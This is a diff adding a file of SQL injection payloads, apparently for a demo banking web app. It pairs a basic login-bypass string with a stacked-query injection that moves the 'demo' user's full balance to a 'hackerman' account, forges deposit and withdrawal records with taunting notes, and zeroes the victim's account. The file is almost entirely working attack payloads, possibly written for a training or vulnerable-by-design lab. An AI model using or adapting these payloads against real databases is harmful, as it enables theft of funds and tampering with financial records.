@@ -1,0 +1,37 @@
+Basic SQL Injection:
+
+
+' or '1'='1
+
+
+Advanced SQL query for withdrawing money:
+
+
+'; UPDATE bank_bankaccount
+SET balance = balance + (SELECT balance FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'))
+WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman');
+
+INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
+VALUES (
+  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman')),
+  (SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
+  'All of demo users money!',
+  'Deposit',
+  '0'
+);
+
+INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
+VALUES (
+  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
+  -1*(SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
+  'Youve been hacked by the infamous Hackerman!',
+  'Withdrawal',
+  '0'
+);
+
+UPDATE bank_bankaccount
+SET balance = 0
+WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'); 
+
+SELECT * FROM auth_user WHERE username='fail
+
